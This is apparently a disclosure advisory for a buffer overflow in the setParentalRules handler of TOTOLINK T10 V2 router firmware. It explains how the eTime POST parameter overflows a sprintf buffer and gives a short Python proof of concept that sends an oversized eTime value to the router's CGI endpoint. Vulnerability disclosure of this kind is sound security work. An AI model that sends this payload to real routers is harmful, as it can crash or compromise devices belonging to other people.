## Overview



- Manufacturer's website information：https://www.totolink.net/
- Firmware download address :https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/172/ids/36.html

## Affected version

| Name            | **Version**             |
| --------------- | ----------------------- |
| T10 V2_Firmware | V4.1.8cu.5241_B20210927 |

## Vulnerability details



In the T10 V2_Firmware V4.1.8cu.5241_B20210927 firmware has a buffer overflow vulnerability in the `setParentalRules` function. The `v9` variable receives the `eTime` parameter from a POST request. However, since the user can control the input of `eTime`, the `sprintf` can cause a buffer overflow vulnerability.

![71e223f0a22ba71413681ee0b77b0a4](https://raw.githubusercontent.com/Ruoyyy/picgo/main/71e223f0a22ba71413681ee0b77b0a4.png)

![78b91ece3fd379991b2d398eea573f0](https://raw.githubusercontent.com/Ruoyyy/picgo/main/78b91ece3fd379991b2d398eea573f0.png)

## POC

```
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1604138238:2"}
data = {
"topicurl":"setParentalRules",
"addEffect":"1",
"mac":"111",
"eTime":"a"*0x1000,
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![3f4e6bd025a3407f204aeb2ce9bd463](https://raw.githubusercontent.com/Ruoyyy/picgo/main/3f4e6bd025a3407f204aeb2ce9bd463.png)